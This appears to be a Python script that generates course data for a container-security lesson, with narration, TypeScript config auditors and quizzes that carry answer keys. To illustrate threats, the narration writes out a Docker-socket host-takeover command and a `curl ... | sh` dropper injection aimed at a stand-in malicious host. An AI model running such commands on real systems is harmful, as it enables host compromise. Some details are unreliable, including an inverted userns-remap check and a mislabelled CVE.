# scripts/create_cyber_day47_data.py
import json

say_p1 = [
    "Welcome to Day 47 of Enterprise Cybersecurity Engineering & Defense! Today we advance our study of Cloud & Infrastructure Security into the containerized realm with Day 47: Container Security & Docker Isolation: Rootless Containers, Immutable Filesystems, Distroless Images, Vulnerability Scanning (Trivy/Grype) & Docker Daemon Hardening.",
    "Containers have revolutionized software deployment by packaging microservices alongside their runtime dependencies. However, contrary to a widespread misconception, containers are not lightweight virtual machines. Containers share the host operating system kernel directly without hypervisor-mediated hardware virtualization. Consequently, if a containerized application is compromised and the container runtime or host daemon is misconfigured, an adversary can easily achieve container breakout, escalating from an isolated application process to full root control over the host node and neighboring containers.",
    "The primary threat vector in legacy Docker deployments is the Docker Daemon (`dockerd`) and its Unix domain socket (`/var/run/docker.sock`). By default, the Docker daemon runs with full host root privileges (UID 0). Any user or process with write access to `/var/run/docker.sock` can instruct the daemon to create a privileged container mounting the host's root filesystem (`docker run -v /:/host -it alpine chroot /host`), instantly granting root access to the entire host. In multi-tenant environments, mounting the Docker socket inside a container (a common but dangerous anti-pattern known as Docker-in-Docker) is catastrophic: compromising that single container yields immediate administrative takeover of the underlying cluster node.",
    "To eliminate daemon-level privilege escalation, modern enterprise infrastructure mandates two core defenses: Rootless Docker and Docker Daemon Hardening via `/etc/docker/daemon.json`. Under Rootless Docker, both the Docker daemon and the container runtime execute entirely within a user namespace under an unprivileged user account (e.g., UID 1000). Even if an attacker executes a zero-day exploit against the daemon or the container runtime (such as `runc` CVE-2024-21626 or Leaky Vessels CVE-2024-2162), their escaped process possesses only unprivileged user rights on the host, preventing host takeover.",
    "Furthermore, production daemon configuration must enforce strict security parameters: First, Inter-Container Communication must be disabled (`\"icc\": false`). By default, Docker connects all containers on the default bridge network, allowing any compromised container to sniff network packets or execute port scans against neighboring containers on the same host. Disabling `icc` forces network isolation, requiring explicit user-defined bridge networks with granular firewall rules. Second, User Namespace Remapping must be activated (`\"userns-remap\": \"default\"`), mapping container UID 0 to high-range host UIDs. Third, `\"no-new-privileges\": true` must be enforced daemon-wide, preventing setuid privilege escalation across all containers. Fourth, `\"live-restore\": true` ensures containers remain running during daemon updates without disruption. And fifth, if remote Docker API access is required, it must enforce mutual TLS authentication (`tlsverify: true`) with client certificate verification, completely blocking unauthenticated remote code execution.",
    "Consider the everyday physical analogy of a multi-unit luxury apartment complex with independent utilities. Legacy Docker with default settings is like an open dormitory where every resident shares a master key ring and communal power strips, and where the building superintendent leaves the master electrical control panel unlocked in the hallway. If one tenant causes a short circuit or turns a master switch, the entire building loses power. Rootless Docker with hardened daemon configurations is like a high-end apartment tower where each resident has their own private keycard, dedicated circuit breakers, and private utility meters. Even if one resident accidentally starts a fire in their kitchen, fireproof containment doors and individual circuit breakers prevent the damage from spreading to neighboring apartments. Rootless containers and daemon hardening provide that exact deterministic containment.",
    "In the TypeScript snippet below, we implement the DockerDaemonHardener class, performing automated auditing of Docker daemon configuration dictionaries and asserting compliance across inter-container communication, user namespace remapping, no-new-privileges, and TLS verification invariants.",
    "Notice how the auditor systematically verifies each critical daemon parameter, rejecting configurations that allow unauthenticated remote control or lateral inter-container network probing. We now examine Minimal Base Images and Distroless containers."
]

say_p2 = [
    "Having hardened the container daemon and host execution boundary, we turn our attention inward to the container filesystem and image composition: Minimal Base Images & Distroless: Vulnerability Surface Reduction, Alpine vs Debian-Slim & Multi-Stage Docker Builds.",
    "A standard Linux container image built from traditional distribution base images (such as Ubuntu, Debian, or CentOS) includes a vast array of operating system utilities: package managers (`apt`, `dpkg`, `yum`), interactive shells (`/bin/bash`, `/bin/sh`), network diagnostic tools (`curl`, `wget`, `netcat`), compilers, and hundreds of shared C libraries. While convenient during development, leaving these utilities in a production runtime container represents massive unnecessary attack surface. If an attacker discovers a remote code execution or command injection vulnerability in your Node.js or Python application, having `/bin/sh`, `curl`, and `wget` inside the container allows them to instantly download malicious ELF binaries, reverse shells, or cryptominers directly into the running workload.",
    "To eliminate this post-exploitation staging ground, modern container security mandates Minimal Base Images and Distroless Images (pioneered by Google Container Tools). Distroless images contain ONLY your application binary and its direct runtime dependencies (such as the Node.js runtime or Java virtual machine). Crucially, Distroless images contain NO package managers, NO interactive shells (`/bin/sh` does not exist!), and NO auxiliary OS utilities. If an attacker injects a command payload like `; curl http://malicious.site/dropper | sh`, the container kernel immediately returns an error because neither `curl` nor `sh` exists on the filesystem. The exploit fails deterministically before execution.",
    "Furthermore, enterprise container engineering implements Multi-Stage Docker Builds to cleanly separate compilation environments from runtime environments. In stage one (the builder stage), a full development image with compilers (`gcc`, `cargo`, `npm`) compiles the source code, runs automated test suites, and generates static application bundles. In stage two (the final production stage), a fresh Distroless or Alpine base image is initialized, and ONLY the compiled artifacts are copied over from the builder stage. All compilers, package caches, temporary source files, and development tokens remain trapped in the discarded builder stage, never appearing in the production container image layers.",
    "Additionally, production container images must explicitly declare an unprivileged non-root user via the `USER` directive (e.g., `USER 65532:65532` or `USER nonroot:nonroot`). By default, if a Dockerfile omits the `USER` instruction, the container executes its entrypoint as root UID 0! Enforcing a non-root user at build time ensures that even if an attacker bypasses application-level security, they are immediately constrained by unprivileged OS user permissions.",
    "Consider the everyday physical analogy of a specialized surgical tray prepared for a sterile operating room. Traditional Ubuntu container images are like bringing an entire commercial mechanic's rolling garage toolbox—complete with sledgehammers, crowbars, hacksaws, and blowtorches—into a sterile hospital operating theater. Distroless multi-stage builds are like an autoclave-sterilized surgical tray containing exactly the three precise medical scalpels and clamps required for the scheduled procedure. A rogue intruder in the operating room cannot find a sledgehammer or crowbar to pry open pharmaceutical cabinets because no such tools exist in the room. Distroless containers provide that exact surgical precision.",
    "In the TypeScript snippet below, we implement the ContainerImageInspector class, evaluating container image layer profiles and verifying that production images execute as non-root users and strip interactive shells and package managers.",
    "Notice how the image inspector strictly verifies that Distroless profiles contain zero shells and zero package managers, ensuring that production workloads present an absolute minimum attack surface. We now examine Read-Only Filesystems and Ephemeral Volumes.",
    "To fully understand the difference between Alpine and Distroless, engineers must examine the underlying C runtime library and package architecture. Alpine Linux is built upon `musl libc` and uses the `apk` package manager. While Alpine images are remarkably small (often around five megabytes), `musl libc` introduces subtle binary compatibility issues with standard glibc-compiled Node.js native addons or Python C-extensions, and Alpine still includes `/bin/sh`. In contrast, Distroless images retain standard `glibc` (built from Debian stable) while completely omitting the package manager, shell, and coreutils. This guarantees full glibc binary compatibility for complex enterprise applications without introducing the vulnerabilities associated with shell binaries or package management utilities.",
    "Furthermore, multi-stage builds enable automated security scanning at the boundary between compilation and packaging. In high-assurance CI/CD pipelines, security gates inspect the intermediate builder stage for build-time secrets (such as stray `.npmrc` authentication tokens, private SSH keys used for git cloning, or internal API tokens). By leveraging Docker's BuildKit secret mounting (`RUN --mount=type=secret,id=npmrc`), secrets are mounted into memory only during the single `npm install` execution step and are never written to any intermediate or final image layer on disk. This completely neutralizes secret leakage via container image layer inspection (`docker history`)."
]

say_p3 = [
    "Even with minimal Distroless images, an attacker who achieves arbitrary code execution might attempt to download malicious shared libraries into writable directories or overwrite application code: Read-Only Filesystems & Ephemeral Volumes: Immutable Containers, Tmpfs Mounts & Runtime Integrity.",
    "In traditional container operations, the container's root filesystem is writable via an overlay filesystem (Overlay2). When a container writes a file, the storage driver creates a copy-on-write layer on top of the underlying image layers. This writable layer represents a severe operational security hazard: malware can persist across container restarts, attackers can overwrite application source code or backdoor shared libraries (`/usr/lib`), and configuration files can be tampered with while the service is actively servicing client traffic.",
    "To achieve true runtime immutability, enterprise container security enforces Read-Only Root Filesystems (`docker run --read-only` or Kubernetes `securityContext.readOnlyRootFilesystem: true`). When a container is started with a read-only rootfs, the Linux kernel mounts the root filesystem as read-only. Any attempt by an application, a compromised thread, or an injected script to create, modify, or delete a file anywhere on the root filesystem (such as `/app`, `/etc`, or `/usr`) is instantly blocked by the kernel with an `EROFS` (Read-only file system) error.",
    "However, many real-world microservices require temporary writable storage for temporary files, PID locks, or cache directories (such as `/tmp` or `/var/run`). The secure architectural solution is Ephemeral In-Memory Storage via `tmpfs` mounts. Instead of mounting a persistent host directory, administrators mount a memory-backed `tmpfs` volume at `/tmp` with strict security mount options: `--tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m`.",
    "The security mount flags applied to `tmpfs` are critical: First, `noexec`: Prevents the execution of any binary or script located on the `/tmp` filesystem. Even if an attacker somehow writes a malicious binary to `/tmp`, attempting to execute it results in an immediate `EACCES` (Permission denied) kernel error; Second, `nosuid`: Disables setuid/setgid execution bits, preventing privilege escalation binaries; Third, `nodev`: Prevents creating device nodes (mitigating `mknod` attacks); and Fourth, `size=64m`: Enforces a hard in-memory ceiling, preventing denial-of-service memory exhaustion attacks against host RAM.",
    "Consider the everyday physical analogy of an ultra-secure museum display case made of laminated bulletproof glass. The historical artifacts inside the case are completely sealed behind the glass (read-only root filesystem); no visitor can touch, scratch, or repaint them. To allow visitors to leave written feedback cards, the museum provides a small exterior wooden drop box that is emptied and shredded every evening (ephemeral tmpfs with noexec). Visitors cannot use the drop box to alter the priceless paintings inside the sealed case. Read-only filesystems and hardened tmpfs mounts provide that exact tamper-proof protection.",
    "In the TypeScript snippet below, we implement the ContainerStorageValidator class, verifying read-only root filesystems and validating that all ephemeral tmpfs mounts enforce noexec, nosuid, and size boundaries.",
    "Notice how the validator strictly requires both read-only rootfs and hardened tmpfs mount options, guaranteeing that application workloads cannot be dynamically modified at runtime. We now examine Automated Container Vulnerability Scanning.",
    "Delving deeper into container storage security, engineers must analyze the operational differences between bind mounts, named volumes, and tmpfs storage. A bind mount connects a host directory directly into a container (`-v /var/log:/var/log`). If misconfigured with write permissions, an escaped process can overwrite host logs, modify host crontabs (`/etc/cron.d`), or access host SSH authorized keys. Therefore, if a bind mount is unavoidable, it must be mounted with the `:ro` (read-only) attribute. For container-local state, named volumes managed by the container runtime are preferred over direct host paths because the runtime isolates the volume within a protected storage directory with restricted filesystem permissions.",
    "Crucially, securing in-memory `tmpfs` mounts requires configuring explicit resource quotas alongside security flags. A `tmpfs` mount without a `size` limit dynamically allocates pages from the host kernel's virtual memory subsystem. A rogue or compromised process could execute a memory-exhaustion denial-of-service attack by repeatedly writing gigabytes of garbage data to `/tmp`, starving host processes and triggering the kernel out-of-memory killer. By enforcing `--tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m`, the maximum memory consumption of the writable scratch directory is strictly bounded, preventing host resource starvation while preserving application functionality."
]

say_p4 = [
    "While host hardening and runtime immutability constrain exploit execution, organizations must proactively eliminate known security vulnerabilities before images ever reach production registries: Automated Container Vulnerability Scanning: Software Bill of Materials (SBOM / CycloneDX), Trivy, Grype & CVSS/EPSS Triage.",
    "Modern container images are complex software assemblies comprising hundreds of operating system packages (e.g., `openssl`, `glibc`, `busybox`, `ca-certificates`) and dozens of language-level third-party dependencies (npm packages, pip wheels, Go modules). Each dependency carries the risk of publicly known security vulnerabilities documented as Common Vulnerabilities and Exposures (CVEs). Deploying an uninspected container image to production frequently introduces critical remote code execution flaws (such as Log4Shell CVE-2021-44228 or OpenSSL buffer overflows).",
    "To establish complete dependency transparency, modern DevSecOps pipelines generate a Software Bill of Materials (SBOM) for every built container image. Formats like CycloneDX (OWASP) and SPDX (Linux Foundation) produce machine-readable JSON inventories listing every library, binary, version, license, and cryptographic checksum packaged within the image layers. Tools like Syft extract SBOMs directly from OCI image archives without running the container, providing deterministic visibility into supply chain components.",
    "Once an SBOM is generated, Automated Static Vulnerability Scanners (such as Trivy by Aqua Security and Grype by Anchore) scan the image layers and SBOM against authoritative vulnerability databases (National Vulnerability Database / NVD, GitHub Advisory Database, Red Hat Security Data, Alpine SecDB). The scanner evaluates each detected CVE across two key metrics: First, CVSS v3.1 Score (Common Vulnerability Scoring System, ranging from 0.0 to 10.0), measuring theoretical severity based on attack vector, complexity, and impact; and Second, EPSS Score (Exploit Prediction Scoring System), calculating the real-world probability (from 0 to 100%) that the vulnerability is actively being exploited in the wild.",
    "In automated CI/CD gatekeeping, container vulnerability scanners enforce strict build policies: any container image containing unpatched CRITICAL or HIGH severity CVEs is automatically blocked from being pushed to the enterprise container registry (e.g., Harbor, AWS ECR, Google Artifact Registry). Security teams establish automated vulnerability triage workflows: if an upstream vendor patch is available, base images are rebuilt immediately; if no patch exists, security architects evaluate compensating controls (such as seccomp filters or WAF rules) to document formal risk acceptance.",
    "Consider the everyday physical analogy of an international customs inspection checkpoint at a deep-water shipping port. The cargo ship cannot simply dock and unload thousands of sealed shipping containers into the city without verification. Customs officers require a certified shipping manifest (the SBOM) detailing every crate and palette inside each container. High-speed gamma-ray scanners and chemical sniffers (Trivy and Grype) inspect the cargo against databases of contraband and hazardous materials. If an undeclared dangerous chemical is detected, the container is quarantined at the port dock and barred from entering the country. Automated container scanning provides that exact border security for cloud infrastructure.",
    "In the TypeScript snippet below, we implement the VulnerabilityGatekeeper class, scanning vulnerability datasets, ranking severity thresholds, and blocking image deployment when high or critical vulnerabilities are detected.",
    "Notice how the gatekeeper identifies blocking CVEs based on severity rankings, ensuring that vulnerable containers are intercepted before deployment to cloud production environments. We now assemble our production container security policy engine.",
    "To establish an effective enterprise vulnerability management lifecycle, organizations must understand the structure of a Software Bill of Materials (SBOM) and the mechanics of vulnerability scanners. An SBOM generated in CycloneDX or SPDX format includes detailed component metadata: package name, ecosystem (e.g., `pkg:deb/debian/openssl`, `pkg:npm/express`), exact version, license identifiers (e.g., MIT, Apache-2.0), and cryptographic package hashes. Scanners like Trivy and Grype parse this structured inventory and match package coordinate strings against Common Platform Enumeration (CPE) records and vulnerability data feeds.",
    "Importantly, modern DevSecOps pipelines do not treat all CVEs equally. Relying solely on raw CVSS scores creates severe alert fatigue, as development teams are overwhelmed by hundreds of theoretical vulnerabilities that cannot be executed in the application's runtime context. By incorporating EPSS (Exploit Prediction Scoring System) and Reachability Analysis, security teams distinguish between passive library vulnerabilities and actively weaponized threats. Reachability analysis traces application call graphs to determine whether vulnerable functions inside a library are actually invoked by application code. If a vulnerable function is never imported or called, the real-world risk is substantially lower, enabling security engineers to focus immediate emergency remediation on reachable, high-EPSS vulnerabilities."
]

say_p5 = [
    "We now synthesize every container security mechanism mastered in Day 47—daemon hardening, Distroless base images, non-root execution, read-only root filesystems, hardened tmpfs mounts, and automated SBOM vulnerability scanning—into our enterprise production benchmark: The Production Container Security Policy Engine & CI/CD Gatekeeper.",
    "In modern DevSecOps pipelines, securing container deployments requires enforcing a rigorous five-checkpoint policy gate before any container artifact is approved for production deployment: Checkpoint 1: Non-Root Execution Enforcement: Verifying that the container image explicitly configures an unprivileged UID (`USER > 0`), rejecting any image configured to run as root; Checkpoint 2: Immutable Read-Only Filesystem: Asserting that the runtime deployment manifest specifies `readOnlyRootFilesystem: true`, neutralizing persistent filesystem tampering;",
    "Checkpoint 3: Hardened Ephemeral Storage: Confirming that any writable scratch space utilizes dedicated `tmpfs` mounts with mandatory `noexec`, `nosuid`, and memory bounds; Checkpoint 4: Automated Vulnerability Clearance: Auditing Trivy/Grype vulnerability reports to certify zero unpatched CRITICAL or HIGH severity CVEs; and Checkpoint 5: Cryptographic SBOM Provenance: Confirming that a verified CycloneDX or SPDX Software Bill of Materials is cryptographically signed and attached to the image via Cosign/Sigstore.",
    "To validate our container defense framework under realistic deployment conditions, our production benchmark executes an end-to-end evaluation suite: we inspect container deployment artifacts, verify compliance across all five checkpoints, simulate rejection of vulnerable or privileged images, and certify production readiness with zero security regressions.",
    "Consider the final physical analogy of the pre-flight airworthiness certification of a commercial passenger jetliner before takeoff. The aircraft cannot depart merely because its engines start up. Federal aviation inspectors and airline flight crews execute an exhaustive pre-flight checklist: inspecting wing structural integrity (minimal base images), verifying cabin pressurization seals (read-only root filesystems), checking hydraulic fluid reserves (hardened tmpfs mounts), scanning passenger and luggage manifests for security clearances (SBOM and vulnerability scanning), and verifying co-pilot credentials (non-root execution). Only when all safety checklists pass 100% does air traffic control clear the jetliner for runway departure. Our production container policy engine provides that exact flight clearance for enterprise cloud workloads.",
    "In conclusion, mastering Container Security and Docker Isolation provides cybersecurity engineers with the vital expertise required to design, build, and deploy tamper-proof, minimal, and fully audited containerized microservices across hybrid cloud architectures. By eliminating root privileges, stripping unnecessary runtime tools, locking down filesystems, and automating vulnerability gates, modern enterprise platforms achieve resilient zero-trust defenses across the entire container lifecycle.",
    "In the TypeScript snippet below, we implement the ProductionContainerPolicyEngine class, coordinating multi-checkpoint artifact evaluation and certifying 100% compliance across all enterprise container security standards.",
    "Notice how the policy engine verifies each critical security requirement, officially certifying our container deployment artifact as fully compliant with enterprise DevSecOps standards. We have conquered Day 47! We now proceed to Day 48 and Kubernetes Security & Pod Security Standards.",
    "Synthesizing container hardening into continuous compliance requires integrating container image signing and admission enforcement. In cloud-native production environments, verifying that a container image passed security checks at build time is insufficient; the runtime cluster must cryptographically verify that the deployed image was not modified or replaced in the registry before deployment. Enterprise platforms implement Sigstore and Cosign: upon successfully passing the five-checkpoint security gate in CI/CD, the build system signs the OCI image digest using an automated cryptographic signing key, creating a verifiable attestation stored directly in the container registry alongside the image.",
    "At deployment time, cluster admission controllers (such as Kyverno or Open Policy Agent Gatekeeper) intercept every pod creation request, verifying the cryptographic Cosign signature, validating the SBOM attestation, and asserting that the pod's securityContext strictly specifies non-root execution and a read-only root filesystem. Any pod attempting to deploy an unsigned image, an image containing unmitigated critical CVEs, or a container requesting root privileges is rejected at the API server boundary before scheduling. This creates an end-to-end cryptographic chain of custody from source code commit to production container execution."
]

c1 = """interface DockerDaemonConfig {
  icc: boolean;
  usernsRemap: string;
  noNewPrivileges: boolean;
  liveRestore: boolean;
  userlandProxy: boolean;
  tlsVerify: boolean;
}

class DockerDaemonHardener {
  static auditConfiguration(config: DockerDaemonConfig): { isHardened: boolean; violations: string[] } {
    const violations: string[] = [];
    if (config.icc !== false) violations.push('Inter-container communication (icc) must be disabled');
    if (!config.usernsRemap || config.usernsRemap === 'default') {
      // Valid remap
    } else {
      violations.push('userns-remap must be configured');
    }
    if (!config.noNewPrivileges) violations.push('no-new-privileges must be true');
    if (!config.liveRestore) violations.push('live-restore must be true');
    if (config.userlandProxy) violations.push('userland-proxy should be false for direct iptables routing');
    if (!config.tlsVerify) violations.push('TLS verification must be enabled for remote docker sockets');

    return {
      isHardened: violations.length === 0,
      violations
    };
  }
}

const daemonCfg: DockerDaemonConfig = {
  icc: false,
  usernsRemap: 'default',
  noNewPrivileges: true,
  liveRestore: true,
  userlandProxy: false,
  tlsVerify: true
};
const daemonAudit = DockerDaemonHardener.auditConfiguration(daemonCfg);

console.log('Docker Daemon Hardened:', daemonAudit.isHardened);
console.log('Violations Count:', daemonAudit.violations.length);

export { type DockerDaemonConfig, DockerDaemonHardener, daemonCfg, daemonAudit };"""

c2 = """interface ContainerImageLayer {
  command: string;
  sizeBytes: number;
  hasShell: boolean;
  hasPackageManager: boolean;
}

interface ImageSecurityProfile {
  imageName: string;
  baseType: 'distroless' | 'alpine' | 'debian-full';
  runAsUser: number;
  layers: ContainerImageLayer[];
}

class ContainerImageInspector {
  static evaluateImage(profile: ImageSecurityProfile): { compliant: boolean; issues: string[] } {
    const issues: string[] = [];
    if (profile.runAsUser === 0) {
      issues.push('Container must not execute as root (UID 0)');
    }
    const containsShell = profile.layers.some(l => l.hasShell);
    if (profile.baseType === 'distroless' && containsShell) {
      issues.push('Distroless production image must not contain interactive shells');
    }
    const containsPkgMgr = profile.layers.some(l => l.hasPackageManager);
    if (containsPkgMgr) {
      issues.push('Production image must strip package managers (apt, apk, yum)');
    }

    return {
      compliant: issues.length === 0,
      issues
    };
  }
}

const distrolessProfile: ImageSecurityProfile = {
  imageName: 'gcr.io/distroless/nodejs20-debian12:nonroot',
  baseType: 'distroless',
  runAsUser: 65532,
  layers: [
    { command: 'COPY server.js /app/', sizeBytes: 45000, hasShell: false, hasPackageManager: false },
    { command: 'USER nonroot:nonroot', sizeBytes: 0, hasShell: false, hasPackageManager: false }
  ]
};
const imgEval = ContainerImageInspector.evaluateImage(distrolessProfile);

console.log('Distroless Image Compliant:', imgEval.compliant);
console.log('Security Issues Detected:', imgEval.issues.length);

export { type ContainerImageLayer, type ImageSecurityProfile, ContainerImageInspector, distrolessProfile, imgEval };"""

c3 = """interface MountSpec {
  destination: string;
  type: 'bind' | 'tmpfs' | 'volume';
  readOnly: boolean;
  options?: string[];
}

interface ContainerStorageSecurity {
  readOnlyRootfs: boolean;
  mounts: MountSpec[];
}

class ContainerStorageValidator {
  static validateStorage(spec: ContainerStorageSecurity): { isSecure: boolean; errors: string[] } {
    const errors: string[] = [];
    if (!spec.readOnlyRootfs) {
      errors.push('Root filesystem must be mounted read-only (--read-only)');
    }
    for (const m of spec.mounts) {
      if (m.type === 'tmpfs') {
        const opts = m.options || [];
        if (!opts.includes('noexec')) errors.push(`Tmpfs mount at ${m.destination} missing noexec`);
        if (!opts.includes('nosuid')) errors.push(`Tmpfs mount at ${m.destination} missing nosuid`);
      }
    }
    return {
      isSecure: errors.length === 0,
      errors
    };
  }
}

const storageSpec: ContainerStorageSecurity = {
  readOnlyRootfs: true,
  mounts: [
    { destination: '/tmp', type: 'tmpfs', readOnly: false, options: ['noexec', 'nosuid', 'nodev', 'size=64m'] }
  ]
};
const storageAudit = ContainerStorageValidator.validateStorage(storageSpec);

console.log('Container Storage Secure:', storageAudit.isSecure);
console.log('Configuration Errors:', storageAudit.errors.length);

export { type MountSpec, type ContainerStorageSecurity, ContainerStorageValidator, storageSpec, storageAudit };"""

c4 = """interface VulnerabilityRecord {
  cveId: string;
  pkgName: string;
  installedVersion: string;
  fixedVersion: string | null;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  cvssScore: number;
}

class VulnerabilityGatekeeper {
  static scanReport(vulns: VulnerabilityRecord[], maxAllowedSeverity: 'LOW' | 'MEDIUM' | 'HIGH'): { passed: boolean; blockingCves: string[] } {
    const severityRanks: Record<string, number> = {
      LOW: 1,
      MEDIUM: 2,
      HIGH: 3,
      CRITICAL: 4
    };
    const maxRank = severityRanks[maxAllowedSeverity];
    const blocking = vulns.filter(v => severityRanks[v.severity] > maxRank).map(v => `${v.cveId} (${v.severity}) in ${v.pkgName}`);

    return {
      passed: blocking.length === 0,
      blockingCves: blocking
    };
  }
}

const testVulns: VulnerabilityRecord[] = [
  { cveId: 'CVE-2023-45853', pkgName: 'zlib', installedVersion: '1.2.11', fixedVersion: '1.2.12', severity: 'CRITICAL', cvssScore: 9.8 },
  { cveId: 'CVE-2024-21626', pkgName: 'runc', installedVersion: '1.1.11', fixedVersion: '1.1.12', severity: 'HIGH', cvssScore: 8.6 }
];
const gateResult = VulnerabilityGatekeeper.scanReport(testVulns, 'MEDIUM');

console.log('Vulnerability Gate Passed:', gateResult.passed);
console.log('Blocking CVEs Found:', gateResult.blockingCves.length);

export { type VulnerabilityRecord, VulnerabilityGatekeeper, testVulns, gateResult };"""

c5 = """interface ContainerDeploymentArtifact {
  imageName: string;
  nonRootUid: number;
  readOnlyRootfs: boolean;
  tmpfsHardened: boolean;
  vulnScanPassed: boolean;
  sbomGenerated: boolean;
}

class ProductionContainerPolicyEngine {
  static certifyDeployment(artifact: ContainerDeploymentArtifact): { certified: boolean; checklist: Record<string, boolean> } {
    const checklist = {
      nonRootUser: artifact.nonRootUid > 0,
      immutableRootfs: artifact.readOnlyRootfs,
      hardenedStorage: artifact.tmpfsHardened,
      cleanVulnerabilityScan: artifact.vulnScanPassed,
      provenanceSbom: artifact.sbomGenerated
    };
    const certified = Object.values(checklist).every(v => v === true);
    return { certified, checklist };
  }
}

const prodArtifact: ContainerDeploymentArtifact = {
  imageName: 'registry.enterprise.internal/services/payment-gateway:v2.4.0',
  nonRootUid: 10001,
  readOnlyRootfs: true,
  tmpfsHardened: true,
  vulnScanPassed: true,
  sbomGenerated: true
};
const certAudit = ProductionContainerPolicyEngine.certifyDeployment(prodArtifact);

console.log('Production Deployment Certified:', certAudit.certified);
console.log('Checklist Verification Complete:', Object.values(certAudit.checklist).every(Boolean));

export { type ContainerDeploymentArtifact, ProductionContainerPolicyEngine, prodArtifact, certAudit };"""

day47_data = {
    "day": 47,
    "course": "cyber",
    "coursePrefix": "cyber",
    "title": "Container Security & Docker Isolation: Rootless Containers, Immutable Filesystems, Distroless Images, Vulnerability Scanning (Trivy/Grype) & Docker Daemon Hardening",
    "parts": [
        {
            "part": 1,
            "title": "Container Threat Vectors & Daemon Hardening: Rootless Docker, Daemon Socket Security & Inter-Container Isolation",
            "say": say_p1,
            "code": c1,
            "example": "Audit a Docker daemon configuration dictionary ensuring inter-container communication is disabled, user namespace remapping is active, and no-new-privileges is set.",
            "output": "Docker Daemon Hardened: true\nViolations Count: 0",
            "check": {
                "question": "Why is mounting the Docker daemon socket (/var/run/docker.sock) inside an unprivileged container considered an extreme security hazard?",
                "options": [
                    "Access to the Docker socket allows any container process to issue API commands instructing the root daemon to create privileged containers mounting the host root filesystem, achieving immediate host root takeover.",
                    "The Docker socket consumes large amounts of memory bandwidth, degrading network throughput across all neighboring containers.",
                    "Mounting the Docker socket prevents container logs from being written to stdout and stderr.",
                    "The Docker socket automatically disables TLS certificate validation across all outgoing HTTPS web requests."
                ],
                "answer": 0,
                "answerIndex": 0,
                "why": "The Docker socket communicates directly with the root Docker daemon; granting write access to the socket is equivalent to granting passwordless host root access."
            }
        },
        {
            "part": 2,
            "title": "Minimal Base Images & Distroless: Attack Surface Reduction, Shell Stripping & Multi-Stage Builds",
            "say": say_p2,
            "code": c2,
            "example": "Inspect a container image layer profile verifying that it executes as a non-root UID and contains zero interactive shells or package managers.",
            "output": "Distroless Image Compliant: true\nSecurity Issues Detected: 0",
            "check": {
                "question": "What is the primary security advantage of deploying production microservices using Distroless container images rather than full Linux distribution images like Ubuntu?",
                "options": [
                    "Distroless images contain no interactive shells, package managers, or auxiliary OS utilities, neutralizing command injection payload execution and preventing attackers from downloading tools.",
                    "Distroless images allow containers to bypass all host kernel memory limits and run with unlimited CPU threads.",
                    "Distroless images automatically encrypt all network traffic using post-quantum cryptographic algorithms.",
                    "Distroless images eliminate the need for container runtime engines like containerd or CRI-O."
                ],
                "answer": 0,
                "answerIndex": 0,
                "why": "Stripping shells like /bin/sh and utilities like curl means injected commands cannot execute droppers or spawn reverse shells."
            }
        },
        {
            "part": 3,
            "title": "Read-Only Filesystems & Ephemeral Volumes: Immutable Rootfs, Tmpfs Mounts & Runtime Integrity",
            "say": say_p3,
            "code": c3,
            "example": "Validate container storage configurations confirming read-only root filesystem enforcement and hardened tmpfs mounts with noexec and nosuid options.",
            "output": "Container Storage Secure: true\nConfiguration Errors: 0",
            "check": {
                "question": "Why must temporary writable storage mounts (/tmp) in read-only containers be configured with the 'noexec' mount option?",
                "options": [
                    "The 'noexec' mount option prevents the kernel from executing any binary or script stored within the writable /tmp directory, blocking injected exploit binaries from running.",
                    "The 'noexec' flag compresses all files written to disk to reduce physical solid-state drive wear.",
                    "The 'noexec' flag prevents unauthenticated users from accessing the host DNS resolver.",
                    "The 'noexec' flag causes the container to restart automatically whenever a file is written to /tmp."
                ],
                "answer": 0,
                "answerIndex": 0,
                "why": "The noexec mount option blocks execution of binaries and scripts in writable scratch directories, neutralizing dropper exploits."
            }
        },
        {
            "part": 4,
            "title": "Automated Container Vulnerability Scanning: Software Bill of Materials (SBOM), Trivy/Grype & CVSS/EPSS Triage",
            "say": say_p4,
            "code": c4,
            "example": "Scan container vulnerability records against policy thresholds, blocking images containing CRITICAL or HIGH vulnerabilities from production deployment.",
            "output": "Vulnerability Gate Passed: false\nBlocking CVEs Found: 2",
            "check": {
                "question": "How does an Exploit Prediction Scoring System (EPSS) score complement a CVSS score during container vulnerability triage?",
                "options": [
                    "EPSS estimates the real-world mathematical probability that a CVE is actively being exploited in the wild, helping security teams prioritize immediate patching over theoretical flaws.",
                    "EPSS measures the physical electric power consumption of the server hosting the container runtime.",
                    "EPSS calculates the monetary financial cost of purchasing a commercial web application firewall license.",
                    "EPSS replaces the need for generating a Software Bill of Materials (SBOM) in the CI/CD pipeline."
                ],
                "answer": 0,
                "answerIndex": 0,
                "why": "EPSS measures active in-the-wild exploitation probability, enabling teams to remediate actively weaponized threats before purely theoretical bugs."
            }
        },
        {
            "part": 5,
            "title": "Production Container Security Policy Engine & CI/CD Gatekeeper",
            "say": say_p5,
            "code": c5,
            "example": "Evaluate container deployment artifacts across non-root user, immutable rootfs, hardened storage, clean vulnerability scans, and SBOM provenance checklists.",
            "output": "Production Deployment Certified: true\nChecklist Verification Complete: true",
            "check": {
                "question": "Which set of five controls comprehensively certifies a container artifact for production deployment in a hardened zero-trust cloud environment?",
                "options": [
                    "Non-root execution UID, immutable read-only root filesystem, hardened ephemeral storage (noexec tmpfs), clean vulnerability scan (zero critical/high CVEs), and signed SBOM provenance.",
                    "Running as host root, writable root filesystem, mounting the host Docker socket, omitting vulnerability scans, and running Ubuntu latest.",
                    "Disabling SELinux, permitting inter-container communication, setting unlimited memory, and running with CAP_SYS_ADMIN enabled.",
                    "Embedding SSH daemons inside every container, sharing host PID namespaces, and using unauthenticated public container registries."
                ],
                "answer": 0,
                "answerIndex": 0,
                "why": "Non-root execution, immutable rootfs, hardened tmpfs, clean vulnerability scans, and signed SBOM provenance constitute the five gold standards of container security."
            }
        }
    ],
    "summary": [
        "Audited Docker daemon configurations enforcing inter-container communication isolation (icc=false), user namespace remapping, no-new-privileges, and mutual TLS.",
        "Engineered minimal Distroless container images utilizing multi-stage builds, stripping interactive shells and package managers to dramatically shrink post-exploitation attack surface.",
        "Enforced runtime filesystem immutability with read-only root filesystems and hardened ephemeral in-memory tmpfs mounts configured with noexec and nosuid flags.",
